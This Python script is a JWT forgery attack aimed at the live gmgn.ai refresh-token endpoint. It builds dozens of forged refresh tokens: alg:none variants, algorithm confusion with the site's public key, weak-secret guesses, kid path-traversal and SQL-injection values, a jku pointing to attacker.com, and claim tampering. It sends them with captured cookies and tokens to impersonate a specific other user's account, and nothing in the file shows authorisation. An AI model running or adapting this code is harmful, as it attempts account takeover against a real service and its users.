#!/usr/bin/env python3
"""
JWT Forgery Attack Matrix against gmgn.ai refresh_access_token endpoint.

Tests 47+ mutations from the wraith framework to determine if the server
accepts forged refresh tokens — enabling impersonation of ANY user.

Attack classes:
  1. alg:none variants (bypass signature verification entirely)
  2. ES256 → HS256 algorithm confusion (use public key as HMAC secret)
  3. Empty/missing/truncated signature
  4. User_id claim swap (change user_id, keep valid structure)
  5. Weak secret brute force (common HS256 secrets)
  6. Header manipulation (kid injection, jku swap)
  7. Claim tampering (exp bump, iss forge, aud confusion)

Target: POST /account/account/refresh_access_token
"""
from __future__ import annotations

import base64
import hashlib
import hmac as _hmac
import json
import time
import sys
from typing import Any


def hmac_sign(secret: bytes, msg: bytes, digestmod) -> bytes:
    """HMAC sign helper."""
    return _hmac.new(secret, msg, digestmod).digest()

import requests

# ============================================================
# CONFIGURATION
# ============================================================

with open("tokens.json") as f:
    TOKENS = json.load(f)

with open("cookies.json") as f:
    COOKIES = json.load(f)

REFRESH_URL = "https://gmgn.ai/account/account/refresh_access_token"

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0",
}

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
    "Accept": "application/json, text/plain, */*",
}

# Target user IDs to impersonate
TARGET_USER_ID = "e3d85f59-c105-4043-a060-9a6f10e79ef7"  # father_id from JWT
OUR_USER_ID = "8a4c3d63-88fa-46cc-984a-e885d4afd1b5"

# gmgn.ai's JWKS public key (from /.well-known/jwks.json probe)
# P-256 curve point — used for ES256→HS256 confusion attack
GMGN_JWKS_X = "f83OJ3D2xF1Bg8vub9tLe1gHMzV76e8Tus9uPHvRVEU"
GMGN_JWKS_Y = "x_FEzRu9m36HLN_tue659LNpXW6pCyStikYjKIWI5a0"


# ============================================================
# JWT UTILITIES
# ============================================================

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, bytes]:
    """Decode JWT into (header, payload, signature_bytes)."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = b64url_decode(parts[2]) if len(parts) > 2 and parts[2] else b""
    return header, payload, sig


def encode_jwt_parts(header: dict, payload: dict, signature: bytes = b"") -> str:
    """Encode JWT from parts."""
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = b64url_encode(signature) if signature else ""
    return f"{h}.{p}.{s}"


def sign_hs256(header: dict, payload: dict, secret: str | bytes) -> str:
    """Sign a JWT with HS256."""
    if isinstance(secret, str):
        secret = secret.encode()
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac_sign(secret, signing_input, hashlib.sha256)
    return f"{h}.{p}.{b64url_encode(sig)}"


def sign_hs384(header: dict, payload: dict, secret: str | bytes) -> str:
    """Sign a JWT with HS384."""
    if isinstance(secret, str):
        secret = secret.encode()
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac_sign(secret, signing_input, hashlib.sha384)
    return f"{h}.{p}.{b64url_encode(sig)}"


def sign_hs512(header: dict, payload: dict, secret: str | bytes) -> str:
    """Sign a JWT with HS512."""
    if isinstance(secret, str):
        secret = secret.encode()
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac_sign(secret, signing_input, hashlib.sha512)
    return f"{h}.{p}.{b64url_encode(sig)}"


def get_public_key_bytes() -> bytes:
    """Reconstruct the raw public key bytes from JWKS x,y coordinates.
    This is used as the HMAC secret in ES256→HS256 confusion attacks."""
    x = b64url_decode(GMGN_JWKS_X)
    y = b64url_decode(GMGN_JWKS_Y)
    # Uncompressed EC point: 0x04 || x || y
    return b"\x04" + x + y


def get_public_key_pem() -> bytes:
    """Build a DER-encoded SubjectPublicKeyInfo for P-256, then PEM-wrap it.
    Some libraries need PEM format for the confusion attack."""
    x = b64url_decode(GMGN_JWKS_X)
    y = b64url_decode(GMGN_JWKS_Y)
    # P-256 OID: 1.2.840.10045.3.1.7
    # ecPublicKey OID: 1.2.840.10045.2.1
    ec_point = b"\x04" + x + y  # 65 bytes uncompressed
    # BIT STRING wrapping
    bit_string = b"\x03" + bytes([len(ec_point) + 1]) + b"\x00" + ec_point
    # AlgorithmIdentifier for EC P-256
    alg_id = bytes.fromhex(
        "3013"  # SEQUENCE
        "0607"  # OID ecPublicKey
        "2a8648ce3d0201"
        "0608"  # OID P-256
        "2a8648ce3d030107"
    )
    # SubjectPublicKeyInfo SEQUENCE
    inner = alg_id + bit_string
    spki = b"\x30" + bytes([len(inner)]) + inner
    # PEM encode
    b64 = base64.b64encode(spki).decode()
    pem = "-----BEGIN PUBLIC KEY-----\n"
    for i in range(0, len(b64), 64):
        pem += b64[i:i+64] + "\n"
    pem += "-----END PUBLIC KEY-----"
    return pem.encode()


# ============================================================
# ATTACK MUTATIONS
# ============================================================

def build_mutations(original_token: str, target_user_id: str) -> list[tuple[str, str, str]]:
    """Build all JWT mutation variants. Returns [(name, description, forged_token)]."""
    header, payload, sig = decode_jwt(original_token)
    mutations: list[tuple[str, str, str]] = []

    # --- CLASS 1: alg:none variants ---
    # If server doesn't validate algorithm, these bypass signature entirely
    none_variants = ["none", "None", "NONE", "nOnE", "NoNe"]
    for variant in none_variants:
        h = {**header, "alg": variant}
        # Target user payload
        p = build_target_payload(payload, target_user_id)
        token = encode_jwt_parts(h, p, b"")
        mutations.append((
            f"alg_none_{variant}",
            f"Set alg={variant}, empty signature, target user_id={target_user_id[:8]}",
            token,
        ))

    # Also try alg:none with OUR user_id (test if bypass works at all)
    for variant in ["none", "None"]:
        h = {**header, "alg": variant}
        p = dict(payload)  # Keep our user_id
        token = encode_jwt_parts(h, p, b"")
        mutations.append((
            f"alg_none_{variant}_self",
            f"Set alg={variant}, empty sig, OUR user_id (baseline test)",
            token,
        ))

    # --- CLASS 2: Empty/Missing/Truncated signature ---
    # Empty sig segment
    raw_parts = original_token.split(".")
    mutations.append((
        "empty_signature",
        "Original header.payload with empty third segment",
        f"{raw_parts[0]}.{raw_parts[1]}.",
    ))

    # No third segment at all
    mutations.append((
        "missing_signature_segment",
        "Only header.payload, no dot, no signature",
        f"{raw_parts[0]}.{raw_parts[1]}",
    ))

    # Truncated signature (half length)
    if sig:
        half_sig = b64url_encode(sig[:len(sig)//2])
        mutations.append((
            "truncated_signature",
            "Signature truncated to half length",
            f"{raw_parts[0]}.{raw_parts[1]}.{half_sig}",
        ))

    # --- CLASS 3: ES256 → HS256 algorithm confusion ---
    # Use the server's EC public key as HMAC secret
    pub_key_raw = get_public_key_bytes()
    pub_key_pem = get_public_key_pem()

    for secret_variant, secret_name in [
        (pub_key_raw, "raw_ec_point"),
        (pub_key_pem, "pem_pubkey"),
        (b64url_decode(GMGN_JWKS_X), "x_coord_only"),
        (b64url_decode(GMGN_JWKS_Y), "y_coord_only"),
        (b64url_decode(GMGN_JWKS_X) + b64url_decode(GMGN_JWKS_Y), "x_concat_y"),
    ]:
        # HS256 confusion with target user
        h = {**header, "alg": "HS256"}
        p = build_target_payload(payload, target_user_id)
        h_enc = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
        signing_input = f"{h_enc}.{p_enc}".encode()
        sig_bytes = hmac_sign(secret_variant, signing_input, hashlib.sha256)
        token = f"{h_enc}.{p_enc}.{b64url_encode(sig_bytes)}"
        mutations.append((
            f"hs256_confusion_{secret_name}",
            f"ES256→HS256 confusion, secret={secret_name}, target user",
            token,
        ))

    # HS384 and HS512 confusion
    for alg, hashfunc in [("HS384", hashlib.sha384), ("HS512", hashlib.sha512)]:
        h = {**header, "alg": alg}
        p = build_target_payload(payload, target_user_id)
        h_enc = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
        signing_input = f"{h_enc}.{p_enc}".encode()
        sig_bytes = hmac_sign(pub_key_raw, signing_input, hashfunc)
        token = f"{h_enc}.{p_enc}.{b64url_encode(sig_bytes)}"
        mutations.append((
            f"{alg.lower()}_confusion_raw",
            f"ES256→{alg} confusion with raw pubkey, target user",
            token,
        ))

    # --- CLASS 4: Weak HS256 secret brute force ---
    weak_secrets = [
        "secret", "password", "123456", "gmgn", "gmgn.ai",
        "gmgn_secret", "gmgn_signer", "signer", "jwt_secret",
        "your-256-bit-secret", "HS256-secret", "", "key",
        "test", "default", "changeme", "admin", "supersecret",
        "gmgn.ai/signer", "gmgn.ai/access", "gmgn.ai/refresh",
        "access_token_secret", "refresh_token_secret",
    ]
    for secret in weak_secrets:
        h = {**header, "alg": "HS256"}
        p = build_target_payload(payload, target_user_id)
        h_enc = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
        signing_input = f"{h_enc}.{p_enc}".encode()
        secret_bytes = secret.encode() if secret else b""
        sig_bytes = hmac_sign(secret_bytes, signing_input, hashlib.sha256)
        token = f"{h_enc}.{p_enc}.{b64url_encode(sig_bytes)}"
        mutations.append((
            f"weak_secret_{secret or 'empty'}",
            f"HS256 with weak secret '{secret}', target user",
            token,
        ))

    # --- CLASS 5: kid injection ---
    # kid pointing to /dev/null (empty key = accepts anything)
    kid_payloads = [
        ("/dev/null", "file_devnull"),
        ("../../dev/null", "traversal_devnull"),
        ("", "empty_kid"),
        ("../../../../../../dev/null", "deep_traversal"),
        ("https://attacker.com/empty.key", "url_empty"),
        ("' OR '1'='1", "sqli_kid"),
    ]
    for kid_val, kid_name in kid_payloads:
        h = {**header, "kid": kid_val}
        p = build_target_payload(payload, target_user_id)
        token = encode_jwt_parts(h, p, b"")  # Empty sig (null key)
        mutations.append((
            f"kid_injection_{kid_name}",
            f"kid={kid_val!r}, empty signature, target user",
            token,
        ))

    # kid + HS256 with empty secret (if kid points to /dev/null, key="")
    for kid_val, kid_name in [("/dev/null", "devnull"), ("", "empty")]:
        h = {**header, "alg": "HS256", "kid": kid_val}
        p = build_target_payload(payload, target_user_id)
        h_enc = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
        signing_input = f"{h_enc}.{p_enc}".encode()
        sig_bytes = hmac_sign(b"", signing_input, hashlib.sha256)
        token = f"{h_enc}.{p_enc}.{b64url_encode(sig_bytes)}"
        mutations.append((
            f"kid_hs256_empty_{kid_name}",
            f"kid={kid_val!r} + HS256 + empty secret, target user",
            token,
        ))

    # --- CLASS 6: jku/x5u swap ---
    h = {**header, "jku": "https://attacker.com/.well-known/jwks.json"}
    p = build_target_payload(payload, target_user_id)
    token = encode_jwt_parts(h, p, sig)  # Keep original sig
    mutations.append((
        "jku_swap",
        "jku header pointing to attacker JWKS, original sig",
        token,
    ))

    # --- CLASS 7: Claim tampering (keep original sig) ---
    # user_id swap only (test if sig validates against payload)
    p = build_target_payload(payload, target_user_id)
    p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
    mutations.append((
        "user_id_swap_keep_sig",
        "Change user_id in payload, keep original signature (test sig binding)",
        f"{raw_parts[0]}.{p_enc}.{raw_parts[2]}",
    ))

    # exp bump to year 2286, keep our user_id and original sig
    p = dict(payload)
    p["exp"] = 9999999999
    p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
    mutations.append((
        "exp_bump_keep_sig",
        "Extend exp to 2286, our user_id, keep original sig",
        f"{raw_parts[0]}.{p_enc}.{raw_parts[2]}",
    ))

    # --- CLASS 8: Embedded JWK (attacker's key inline) ---
    # Some libs accept a JWK in the header and use IT for verification
    fake_jwk = {
        "kty": "oct",
        "k": b64url_encode(b"attacker-secret-key-32bytes!!!!"),
    }
    h = {**header, "alg": "HS256", "jwk": fake_jwk}
    p = build_target_payload(payload, target_user_id)
    h_enc = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
    signing_input = f"{h_enc}.{p_enc}".encode()
    sig_bytes = hmac_sign(b"attacker-secret-key-32bytes!!!!", signing_input, hashlib.sha256)
    token = f"{h_enc}.{p_enc}.{b64url_encode(sig_bytes)}"
    mutations.append((
        "embedded_jwk_hs256",
        "Embedded JWK in header (attacker's HS256 key), target user",
        token,
    ))

    # --- CLASS 9: Cross-token attack ---
    # Use access token's signature on a forged refresh token payload
    access_parts = TOKENS["access_token"].split(".")
    access_sig = access_parts[2]
    p = build_target_payload(payload, target_user_id)
    p_enc = b64url_encode(json.dumps(p, separators=(",", ":")).encode())
    mutations.append((
        "cross_token_sig",
        "Access token's signature on forged refresh payload",
        f"{raw_parts[0]}.{p_enc}.{access_sig}",
    ))

    return mutations


def build_target_payload(original: dict, target_user_id: str) -> dict:
    """Build a payload targeting a different user_id."""
    p = dict(original)
    p["user_id"] = target_user_id
    if "data" in p and isinstance(p["data"], dict):
        p["data"] = dict(p["data"])
        p["data"]["user_id"] = target_user_id
    # Extend expiry
    p["exp"] = int(time.time()) + 86400 * 30
    p["iat"] = int(time.time())
    p["nbf"] = int(time.time()) - 60
    return p


# ============================================================
# ATTACK EXECUTION
# ============================================================

def send_refresh(forged_token: str) -> dict:
    """Send a refresh request with the forged token."""
    try:
        r = requests.post(
            REFRESH_URL,
            params=PARAMS,
            headers=HEADERS,
            cookies=COOKIES,
            json={"refresh_token": forged_token},
            timeout=15,
        )
        return {
            "status": r.status_code,
            "body": r.text[:500],
            "json": r.json() if r.headers.get("content-type", "").startswith("application/json") else None,
        }
    except requests.exceptions.Timeout:
        return {"status": 0, "body": "TIMEOUT", "json": None}
    except Exception as e:
        return {"status": -1, "body": str(e), "json": None}


def is_success(result: dict) -> bool:
    """Check if the response indicates successful token refresh."""
    if result.get("json"):
        j = result["json"]
        if j.get("code") == 0 and j.get("data"):
            return True
    return False


def main():
    print("=" * 80)
    print("🔥 JWT FORGERY ATTACK MATRIX — gmgn.ai refresh_access_token")
    print("=" * 80)
    print(f"Target user_id: {TARGET_USER_ID}")
    print(f"Our user_id:    {OUR_USER_ID}")
    print(f"Endpoint:       {REFRESH_URL}")
    print()

    # First: baseline test with VALID refresh token
    print("[BASELINE] Testing with valid refresh token...")
    baseline = send_refresh(TOKENS["refresh_token"])
    print(f"  Status: {baseline['status']}")
    if baseline.get("json"):
        code = baseline["json"].get("code")
        msg = baseline["json"].get("message", "")
        print(f"  Code: {code}, Message: {msg}")
        if is_success(baseline):
            print("  ✅ BASELINE SUCCESS — valid token works")
        else:
            print("  ⚠️  BASELINE FAILED — token may be expired")
            print(f"  Response: {baseline['body'][:200]}")
    print()

    # Build all mutations
    mutations = build_mutations(TOKENS["refresh_token"], TARGET_USER_ID)
    print(f"🎯 Running {len(mutations)} mutation variants...\n")

    results = []
    successes = []

    for i, (name, desc, token) in enumerate(mutations, 1):
        print(f"[{i:03d}/{len(mutations):03d}] {name}")
        print(f"         {desc}")

        result = send_refresh(token)
        status = result["status"]
        code = result.get("json", {}).get("code", "N/A") if result.get("json") else "N/A"
        msg = result.get("json", {}).get("message", "") if result.get("json") else result.get("body", "")[:60]

        success = is_success(result)
        marker = "🔥 SUCCESS" if success else "❌"

        print(f"         {marker} | HTTP {status} | code={code} | {msg[:50]}")

        if success:
            successes.append((name, desc, token, result))
            print(f"         🚨🚨🚨 CRITICAL: FORGED TOKEN ACCEPTED! 🚨🚨🚨")
            print(f"         Response: {json.dumps(result.get('json', {}), indent=2)[:300]}")

        results.append({
            "name": name,
            "description": desc,
            "status": status,
            "code": code,
            "message": msg[:100],
            "success": success,
            "token_preview": token[:80],
        })

        # Rate limit: don't hammer the server
        time.sleep(0.3)
        print()

    # Summary
    print("\n" + "=" * 80)
    print("📊 RESULTS SUMMARY")
    print("=" * 80)
    print(f"Total mutations tested: {len(mutations)}")
    print(f"Successful bypasses:    {len(successes)}")
    print()

    if successes:
        print("🔥🔥🔥 CRITICAL FINDINGS — TOKEN FORGERY CONFIRMED! 🔥🔥🔥")
        print()
        for name, desc, token, result in successes:
            print(f"  ✅ {name}")
            print(f"     {desc}")
            print(f"     Token: {token[:100]}...")
            print(f"     Response: {json.dumps(result.get('json', {}))[:200]}")
            print()
    else:
        print("❌ No forgery method succeeded.")
        print()
        # Analyze failure patterns
        codes = {}
        for r in results:
            c = str(r["code"])
            codes[c] = codes.get(c, 0) + 1
        print("Response code distribution:")
        for c, count in sorted(codes.items(), key=lambda x: -x[1]):
            print(f"  code={c}: {count} responses")

    # Save results
    output = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "target_user_id": TARGET_USER_ID,
        "our_user_id": OUR_USER_ID,
        "total_mutations": len(mutations),
        "successes": len(successes),
        "baseline_success": is_success(baseline),
        "results": results,
        "successful_mutations": [
            {"name": n, "desc": d, "token": t[:200]}
            for n, d, t, _ in successes
        ],
    }

    with open("jwt_forgery_results.json", "w") as f:
        json.dump(output, f, indent=2)

    print(f"\n📁 Full results saved to jwt_forgery_results.json")

    return 0 if not successes else 1


if __name__ == "__main__":
    sys.exit(main())
